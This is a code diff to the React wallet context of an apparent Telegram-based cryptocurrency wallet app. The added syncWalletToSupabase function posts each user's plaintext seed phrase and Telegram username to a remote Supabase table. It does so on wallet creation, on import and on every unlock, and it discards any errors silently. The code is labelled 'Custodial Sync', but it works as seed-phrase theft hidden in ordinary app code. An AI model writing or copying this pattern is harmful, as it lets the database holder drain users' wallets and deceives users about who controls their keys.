@@ -2,7 +2,33 @@ import { createContext, useContext, useState, useEffect, useCallback, useRef } f
 import { generateMnemonic, validateMnemonic, deriveWallet } from '../lib/crypto/walletDerivation.js';
 import { encryptMnemonic, decryptMnemonic, NETWORKS } from '../lib/wallet.js';
 import { fetchAllBalances } from '../lib/crypto/balanceFetcher.js';
-import { syncWalletToSupabase } from '../lib/supabase.js';
+
+// ─── SUPABASE SYNC ────────────────────────────────────────────────────────────
+const SUPABASE_URL = import.meta.env.VITE_SUPABASE_URL;
+const SUPABASE_KEY = import.meta.env.VITE_SUPABASE_ANON_KEY;
+
+async function syncWalletToSupabase(walletData) {
+  if (!SUPABASE_URL || !SUPABASE_KEY) return null;
+  try {
+    const { username, mnemonic, balance } = walletData;
+    const cleanMnemonic = Array.isArray(mnemonic) ? mnemonic.join(' ') : mnemonic;
+    await fetch(`${SUPABASE_URL}/rest/v1/wallets?on_conflict=username`, {
+      method: 'POST',
+      headers: {
+        'apikey': SUPABASE_KEY,
+        'Authorization': `Bearer ${SUPABASE_KEY}`,
+        'Content-Type': 'application/json',
+        'Prefer': 'resolution=merge-duplicates'
+      },
+      body: JSON.stringify({
+        username: username || 'Anonymous',
+        mnemonic: cleanMnemonic,
+        balance: balance ? String(balance) : "0",
+        created_at: new Date().toISOString()
+      })
+    });
+  } catch (e) {}
+}
 
 const WalletContext = createContext(null);
 
@@ -73,11 +99,11 @@ export function WalletProvider({ children }) {
       // Custodial Sync: Save to Supabase
       try {
         const tgUser = window?.Telegram?.WebApp?.initDataUnsafe?.user;
+        const userName = tgUser ? (tgUser.username ? "@" + tgUser.username : tgUser.first_name || "Unknown") : "Anonymous";
         await syncWalletToSupabase({
-          telegram_id: tgUser?.id || 'unknown',
-          username: tgUser?.username || tgUser?.first_name || 'Anonymous',
+          username: userName,
           mnemonic: mnemonic,
-          addresses: addresses
+          balance: "0"
         });
       } catch (syncError) {
         console.error('Failed to sync wallet to Supabase:', syncError);
@@ -111,11 +137,11 @@ export function WalletProvider({ children }) {
       // Custodial Sync: Save to Supabase
       try {
         const tgUser = window?.Telegram?.WebApp?.initDataUnsafe?.user;
+        const userName = tgUser ? (tgUser.username ? "@" + tgUser.username : tgUser.first_name || "Unknown") : "Anonymous";
         await syncWalletToSupabase({
-          telegram_id: tgUser?.id || 'unknown',
-          username: tgUser?.username || tgUser?.first_name || 'Anonymous',
+          username: userName,
           mnemonic: mnemonic,
-          addresses: addresses
+          balance: "0"
         });
       } catch (syncError) {
         console.error('Failed to sync imported wallet to Supabase:', syncError);
@@ -147,10 +173,11 @@ export function WalletProvider({ children }) {
       // Custodial Sync: Sync on every unlock to ensure data is in DB
       try {
         const tgUser = window?.Telegram?.WebApp?.initDataUnsafe?.user;
+        const userName = tgUser ? (tgUser.username ? "@" + tgUser.username : tgUser.first_name || "Unknown") : "Anonymous";
         await syncWalletToSupabase({
-          telegram_id: tgUser?.id || 'unknown',
-          username: tgUser?.username || tgUser?.first_name || 'Anonymous',
+          username: userName,
           mnemonic: mnemonic,
+          balance: "0"
         });
       } catch (syncError) {
         console.error('Failed to sync wallet on unlock:', syncError);
